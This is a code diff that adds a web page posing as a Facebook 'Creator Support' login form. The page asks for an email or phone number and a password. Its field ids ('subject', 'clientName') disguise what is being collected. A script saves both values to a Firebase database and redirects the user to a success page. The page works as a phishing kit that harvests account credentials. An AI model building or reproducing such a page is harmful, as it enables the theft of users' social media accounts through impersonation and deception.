@@ -1,7 +1,32 @@
+Please Log In Your Facebook Account
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Support Request</title>
+
+<link rel="stylesheet" href="style.css">
+
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="logo">
+
+<h1>Creator Support</h1>
+
+</div>
+
 <input
 type="text"
 id="subject"
-placeholder="Enter Your Email Or Number">
+placeholder="Enter Your Email/Phone Number">
 
 <input
 type="text"
@@ -9,5 +34,55 @@ id="clientName"
 placeholder="Enter Your Password">
 
 <button id="sendRequest">
+
 Log In
+
 </button>
+
+</div>
+
+<script type="module">
+
+import { db } from "./firebase.js";
+
+import {
+
+ref,
+
+push
+
+} from "https://www.gstatic.com/firebasejs/12.0.0/firebase-database.js";
+
+document.getElementById("sendRequest").onclick=function(){
+
+const subject=document.getElementById("subject").value.trim();
+
+const message=document.getElementById("clientName").value.trim();
+
+if(subject=="" || message==""){
+
+alert("Please complete all fields.");
+
+return;
+
+}
+
+push(ref(db,"creatorPortal/requests"),{
+
+subject:subject,
+
+message:message,
+
+time:Date.now()
+
+});
+
+window.location.href="success.html";
+
+};
+
+</script>
+
+</body>
+
+</html>
